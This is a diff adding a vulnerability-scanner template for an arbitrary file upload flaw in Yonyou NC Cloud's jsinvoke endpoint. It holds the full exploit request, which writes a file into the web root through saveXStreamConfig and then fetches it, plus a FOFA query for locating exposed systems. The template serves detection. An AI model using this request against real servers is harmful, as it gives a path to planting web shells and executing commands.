@@ -1,0 +1,39 @@
+id: yonyou-nc-cloud-jsinvoke-fileupload
+
+info:
+  name: 用友 NC Cloud jsinvoke - fileupload
+  author: leadlife
+  severity: critical
+  description: An arbitrary file upload vulnerability in the Yonyou NC-Cloud system. Attackers can upload any files to the server and upload web shells, thereby gaining command execution privileges on the server.
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E7%94%A8%E5%8F%8B%20NC%20Cloud%20jsinvoke%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="用友-NC-Cloud"
+  tags: yonyou,fileupload,nccloud,oa
+
+http:
+  - raw:
+      - |
+        POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+
+        {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig",
+        "parameterTypes":["java.lang.Object","java.lang.String"],
+        "parameters":["{{randstr_2}}","webapps/nc_web/{{randstr_1}}.jsp"]}
+      
+      - |
+        GET /{{randstr_1}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 || status_code_1 == 500
+          - status_code_2 == 200 && contains(body_2,"{{randstr_2}}")
+        condition: and
+
+
+# 执行命令：https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8Bnc-cloud_RCE
+# 上传文件：https://wiki.wy876.cn/#/%E7%94%A8%E5%8F%8Bnc-cloud_RCE
